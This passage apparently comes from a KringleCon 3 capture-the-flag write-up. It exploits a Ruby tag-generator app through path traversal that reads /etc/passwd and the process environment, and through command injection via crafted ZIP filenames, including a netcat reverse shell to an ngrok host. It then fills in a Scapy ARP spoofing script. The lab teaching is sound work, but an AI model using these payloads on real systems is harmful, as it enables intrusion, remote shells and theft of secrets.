    <img data-src="/images/kringlecon3/objectives/obj08_09.webp" alt="upload of a PDF file" data-caption="upload of a PDF file" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      upload of a PDF file
      
        
        
      
    </figcaption>
  
</figure>
<p>The error message leaks the path to the server application <code>/app/lib/app.rb</code>, it is a <em>Ruby</em> application and we see as well that our file is first stored in the <code>/tmp</code> folder with a temporary name set by the server.</p>
<p>An endpoint discovery with <code>wfuzz</code> finds 2 additional endpoints:</p>
<div class="box">$ wfuzz -w wordlists/big.txt &ndash;hc=403,404 <a href="https://tag-generator.kringlecastle.com/FUZZ">https://tag-generator.kringlecastle.com/FUZZ</a><br />
[&hellip;]<br />
000000961:   302        0 L      0 W      0 Ch        &ldquo;clear&rdquo;<br />
000001947:   501        3 L      9 W      80 Ch       &ldquo;image&rdquo;<br />
000003398:   501        3 L      9 W      80 Ch       &ldquo;share&rdquo;</div>
<p>The <code>clear</code> endpoint doesn&rsquo;t do much. The <code>image</code> and <code>share</code> endpoints show the same error:</p>
<div class="box">Error in /app/lib/app.rb: ID is missing!</div>
<p>If we try to add the <code>id</code> argument to the <code>image</code> endpoint we get an error 501 with an interesting error:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj08_10.webp" alt="image endpoint error" data-caption="image endpoint error" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      image endpoint error
      
        
        
      
    </figcaption>
  
</figure>
<p>It looks for a file in the <code>/tmp</code> folder. Actually, we can retrieve the image we uploaded before by using its <em>ID</em>:</p>
<div class="box">$ curl <a href="https://tag-generator.kringlecastle.com/image?id=09fef071-b2d4-4051-8854-f779176d8739.png">https://tag-generator.kringlecastle.com/image?id=09fef071-b2d4-4051-8854-f779176d8739.png</a> &ndash;output -</div>
<p>Let&rsquo;s see if we can have a <em>Directory Traversal/Arbitrary File Read</em> vulnerability here by calling a system file:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj08_11.webp" alt="curl https://tag-generator.kringlecastle.com/image?id=../etc/passwd" data-caption="curl https://tag-generator.kringlecastle.com/image?id=../etc/passwd" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      curl https://tag-generator.kringlecastle.com/image?id=../etc/passwd
      
        
        
      
    </figcaption>
  
</figure>
<p>Great! We can download the server source code as well as we know its path:</p>
<div class="box">$ wget <a href="https://tag-generator.kringlecastle.com/image?id=../app/lib/app.rb">https://tag-generator.kringlecastle.com/image?id=../app/lib/app.rb</a></div>
<p>At this point, we could already validate the <em>Objective</em> as all we have to do is read the <code>GREETZ</code> environment variable. This can be easily achieved by reading the <code>/proc/self/environ</code> file that contains the environment variables of the current process:</p>
<div class="box">$ curl <a href="https://tag-generator.kringlecastle.com/image?id=../proc/self/environ">https://tag-generator.kringlecastle.com/image?id=../proc/self/environ</a> &ndash;output -<br />
PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br />
HOSTNAME=43b7c645315f<br />
RUBY_MAJOR=2.7<br />
RUBY_VERSION=2.7.0<br />
RUBY_DOWNLOAD_SHA256=27d350a52a02b53034ca0794efe518667d558f152656c2baaf08f3d0c8b02343<br />
GEM_HOME=/usr/local/bundle<br />
BUNDLE_SILENCE_ROOT_WARNING=1<br />
BUNDLE_APP_CONFIG=/usr/local/bundle<br />
APP_HOME=/app<br />
PORT=4141<br />
HOST=0.0.0.0<br />
GREETZ=JackFrostWasHere<br />
HOME=/home/app</div>
<div class="notices success" data-title="Objective 8 answer">
  JackFrostWasHere
</div>
<p>However, let&rsquo;s still analyze the server source code (full code <a href="https://gist.github.com/noobintheshell/f7858980df48ee4d307dda898daef488">here</a>). The code of the <code>image</code> endpoint shows why we are able to read the server&rsquo;s files:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj08_12.webp" alt="curl https://tag-generator.kringlecastle.com/image?id=../etc/passwd" data-caption="curl https://tag-generator.kringlecastle.com/image?id=../etc/passwd" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      curl https://tag-generator.kringlecastle.com/image?id=../etc/passwd
      
        
        
      
    </figcaption>
  
</figure>
<p>Apparently, <strong>Jack</strong> disabled the <code>id</code> validation that now allows all special characters.</p>
<p>The <code>upload</code> endpoint, calls the <code>process_file()</code> function where we see that on top of <code>png</code> and <code>jpg</code> files, <em>ZIP</em> archives are as well supported:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj08_13.webp" alt="process_file() source code" data-caption="process_file() source code" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      process_file() source code
      
        
        
      
    </figcaption>
  
</figure>
<p>In the case of an image, the <code>handle_image()</code> function is called. It generates a random filename and starts a thread that will do a <code>system</code> call to execute <code>convert</code> to resize the image before storing it in the <code>/tmp</code> folder:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj08_14.webp" alt="handle_image() source code" data-caption="handle_image() source code" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      handle_image() source code
      
        
        
      
    </figcaption>
  
</figure>
<p>The <code>convert</code> binary is called with our filename as argument without being validated! We could potentially execute commands here if we had control over the filename. A file called <code>';ls #.png</code> would execute <code>ls</code> as follows:</p>
<div class="box">convert -resize 800x600\&gt; -quality 75 &lsquo;';ls #.png &lsquo;/tmp/xxx&rsquo;</div>
<p>Whatever is after the <code>#</code> will be seen as a comment. But, as we have seen previously, we do not have control over the filename here as the server renames it to a temporary filename after the upload.</p>
<p>The <code>ZIP</code> file handler, however, does not rename the files after extraction:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj08_15.webp" alt="handle_zip() source code" data-caption="handle_zip() source code" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      handle_zip() source code
      
        
        
      
    </figcaption>
  
</figure>
<p>Again, <strong>Jack</strong> disabled the filename validation and as the files are not renamed before being stored in the <code>/tmp</code> folder, we have full control over the filenames, and therefore could achieve <em>Remote Command Execution</em> (<em>RCE</em>). As we won&rsquo;t see the result of our commands, we can output it in a file and then download it. Let&rsquo;s create the following dummy file to read the output of the <code>env</code> command and then <em>ZIP</em> it:</p>
<div class="box">$ touch &ldquo;';env&gt;noob #.png&rdquo;<br />
$ zip archive.zip &ldquo;';env&gt;noob #.png&rdquo;</div>
<p>We upload <code>archive.zip</code> and then download the <code>noob</code> file, which is found in the server&rsquo;s default working directory <code>/tmp</code>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj08_16.webp" alt="remote code execution" data-caption="remote code execution" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      remote code execution
      
        
        
      
    </figcaption>
  
</figure>
<p>Let&rsquo;s go a step further now and try to have a shell on the server. Some characters like <code>/</code> are not allowed in filenames so we need to be careful with that. We can try a <em>Netcat</em> reverse shell by leveraging <a href="https://ngrok.com/">ngrok</a>, a free service to tunnel the public traffic to localhost. We simply start it with <code>ngrok tcp 1234</code> where <code>1234</code> is the local port. We get a temporary public endpoint and port to use:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj08_17.webp" alt="ngrok" data-caption="ngrok" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      ngrok
      
        
        
      
    </figcaption>
  
</figure>
<p>Then our payload will be:</p>
<div class="box">$ touch &ldquo;';nc 0.tcp.ngrok.io 19686 -c bash #.png&rdquo;<br />
$ zip archive.zip &ldquo;';nc 0.tcp.ngrok.io 19686 -c bash #.png&rdquo;<br />
$ nc -lnvp 1234 # start netcat listener on port 1234</div>
<p>We upload the <em>ZIP</em>…and we get a reverse shell as the user <code>app</code>!!</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj08_18.webp" alt="reverse shell" data-caption="reverse shell" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      reverse shell
      
        
        
      
    </figcaption>
  
</figure>
<p>There is one last vulnerability that we can exploit. The upload feature is vulnerable to <a href="https://snyk.io/research/zip-slip-vulnerability">Zip Slip</a>. We can craft an evil <em>ZIP</em> file that can add/overwrite any file on the system where the user <code>app</code> can write.</p>
<p>We can now move on to the next objective…Talking again to <strong>Noel</strong> shows he is happy but has some work to do:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><strong>Noel Boetie:</strong><br />
Yay! You found the flaw!<br />
We&rsquo;ll work on fixing it.</div>
<p>We unlock a new narrative:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/narrative/narrative05.webp" alt="narrative 5 of 7" data-caption="narrative 5 of 7" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      narrative 5 of 7
      
        
        
      
    </figcaption>
  
</figure>
<h3 id="9---arp-shenanigans">9 - ARP Shenanigans</h3>
<hr />
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj09_01.webp" alt="Objective 9 description" data-caption="Objective 9 description" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Objective 9 description
      
        
        
      
    </figcaption>
  
</figure>
<p>Again, the terminal is only accessible to <strong>Santa</strong>.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj09_02.webp" alt="Objective 9 location" data-caption="Objective 9 location" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Objective 9 location
      
        
        
      
    </figcaption>
  
</figure>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Alabaster Snowball:</strong><br />
Hey <strong>Santa</strong>! You&rsquo;ve got to check out our <em>Scapy Present Packet Prepper</em>! Please work through the whole thing to make sure it&rsquo;s helpful for our guests! I made it so that players can <code>help()</code> to see how to get tasks and hints. When you&rsquo;re done, maybe you can help me with this other issue I&rsquo;m having.</p>
<p>Oh, I see the <a href="#7---scapy-prepper">Scapy Present Packet Prepper</a> has already been completed! Now you can help me get access to this machine.</p>
<p>It seems that some interloper here at the <em>North Pole</em> has taken control of the host. We need to regain access to some important documents associated with <em>Kringle Castle</em>. Maybe we should try a machine-in-the-middle attack? That could give us access to manipulate <em>DNS</em> responses. But we&rsquo;ll still need to cook up something to change the <em>HTTP</em> response. I&rsquo;m sure glad you&rsquo;re here <strong>Santa</strong>.</p>
</div>
<p>We have access to 3 <em>TMUX</em> terminals to help in this task. One of them shows the following message:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj09_04.webp" alt="welcome message" data-caption="welcome message" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      welcome message
      
        
        
      
    </figcaption>
  
</figure>
<p>After having completed the <a href="#7---scapy-prepper">Scapy Present Packet Prepper</a> challenge we got some interesting hints to help us achieve this objective. Let&rsquo;s take them one by one:</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">H1. <strong>Jack Frost</strong> must have gotten malware on our host at <code>10.6.6.35</code> because we can no longer access it. Try sniffing the <code>eth0</code> interface using <code>tcpdump -nni eth0</code> to see if you can view any traffic from that host.</div>
<p>Our <em>IP</em> address is <code>10.6.0.2</code> and we know from the hints that <code>10.6.6.35</code> may have been hit by a malware. When sniffing <code>eth0</code> we mainly get <em>ARP</em> requests from the <code>10.6.6.35</code> that asks who has the <code>10.6.6.53</code>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj09_03.webp" alt="tcpdump capture" data-caption="tcpdump capture" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      tcpdump capture
      
        
        
      
    </figcaption>
  
</figure>
<div class="alert alert-warning" role="alert" data-dir="ltr">H2. The host is performing an <em>ARP</em> request. Perhaps we could do a spoof to perform a machine-in-the-middle attack. I think we have some sample scapy traffic scripts that could help you in <code>/home/guest/scripts</code>.</div>
<p>To achieve <em>ARP</em> spoofing, we can use the given script <code>/home/guest/scripts/arp_resp.py</code>. Almost everything is ready, we only need to replace the  <code>SOME*HERE</code> and <code>99999</code> values to match the protocol and then execute it:</p>
<script type="application/javascript" src="https://gist.github.com/noobintheshell/091bc19bf705d2b5d01e73babe4ab9b5.js"></script>

<p>We can have a look at <a href="https://www.cloudshark.org/captures/d97c5b81b057">this example</a> to help. Let&rsquo;s start with line 14. The <em>Ethernet</em> source is our own one that we can get with <code>ifconfig</code> or we can simply re-use the <code>macaddr</code> variable:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj09_05.webp" alt="source MAC address" data-caption="source MAC address" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      source MAC address
      
        
        
      
    </figcaption>
  
</figure>
<p>For the <em>Ethernet</em> destination, we need to capture the attacker packet with more details. This can be achieved by displaying the <code>ARP</code> table:</p>
<div class="box">$ arp -a          <br />
arp_requester.guestnet0.kringlecastle.com (10.6.6.35) at 4c:24:57:ab:ed:84 [ether] on eth0</div>
<p>Line 14 becomes:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">ether_resp</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s2">&#34;4c:24:57:ab:ed:84&#34;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="mh">0x806</span><span class="p">,</span> <span class="n">src</span><span class="o">=</span><span class="n">macaddr</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>For the <em>ARP</em> reply options (lines 16 to 21):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">arp_response</span> <span class="o">=</span> <span class="n">ARP</span><span class="p">(</span><span class="n">pdst</span><span class="o">=</span><span class="s2">&#34;4c:24:57:ab:ed:84&#34;</span><span class="p">)</span>        
<span class="n">arp_response</span><span class="o">.</span><span class="n">op</span>     <span class="o">=</span> <span class="mi">2</span>      <span class="c1"># reply operation    </span>
<span class="n">arp_response</span><span class="o">.</span><span class="n">plen</span>   <span class="o">=</span> <span class="mi">4</span>      <span class="c1"># protocol size</span>
<span class="n">arp_response</span><span class="o">.</span><span class="n">hwlen</span>  <span class="o">=</span> <span class="mi">6</span>      <span class="c1"># hardware addresse size</span>
<span class="n">arp_response</span><span class="o">.</span><span class="n">ptype</span>  <span class="o">=</span> <span class="mh">0x800</span>  <span class="c1"># protocol type IPv4</span>
<span class="n">arp_response</span><span class="o">.</span><span class="n">hwtype</span> <span class="o">=</span> <span class="mi">1</span>      <span class="c1"># hardware protocol Ethernet</span>
</code></pre></td></tr></table>
</div>
</div><p>For the source and destinations addresses (lines 23 to 26):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">arp_response</span><span class="o">.</span><span class="n">hwsrc</span> <span class="o">=</span> <span class="n">macaddr</span>             <span class="c1"># our Mac address</span>
<span class="n">arp_response</span><span class="o">.</span><span class="n">psrc</span>  <span class="o">=</span> <span class="s2">&#34;10.6.6.53&#34;</span>         <span class="c1"># the spoofed IP address</span>
<span class="n">arp_response</span><span class="o">.</span><span class="n">hwdst</span> <span class="o">=</span> <span class="s2">&#34;4c:24:57:ab:ed:84&#34;</span> <span class="c1"># attacker Mac address</span>
<span class="n">arp_response</span><span class="o">.</span><span class="n">pdst</span>  <span class="o">=</span> <span class="s2">&#34;10.6.6.35&#34;</span>         <span class="c1"># attacker IP address</span>
</code></pre></td></tr></table>
</div>
</div><p>We launch our modified script while capturing packets:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj09_06.webp" alt="ARP spoofing" data-caption="ARP spoofing" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      ARP spoofing
      
        
        
      
    </figcaption>
  
</figure>
